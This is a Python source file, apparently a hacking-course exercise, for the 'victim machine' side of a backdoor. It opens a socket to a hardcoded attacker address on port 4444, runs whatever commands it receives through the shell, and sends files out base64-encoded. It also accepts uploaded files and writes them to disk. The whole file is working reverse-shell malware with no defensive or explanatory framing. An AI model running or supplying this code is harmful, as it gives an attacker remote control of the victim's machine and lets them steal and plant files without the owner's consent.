import socket,subprocess,json,os,base64


# Victim - Victim Machine



class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        
    def execute_command(self,command):
        return subprocess.check_output(command,shell=True)  
        
    def box_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
        
    def change_directory(self,path):
        os.chdir(path)
        return "[+] Changing Directory To " + path

    def box_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,file_name,content):
        with open(file_name,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download sucessfully"

    def run(self):
        while True:
            command = self.box_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_command(command)
            except Exception:
                command_result = "[+] Error While Running the command"
            self.box_send(command_result)


backdoor = Backdoor("192.168.1.11",4444)
backdoor.run()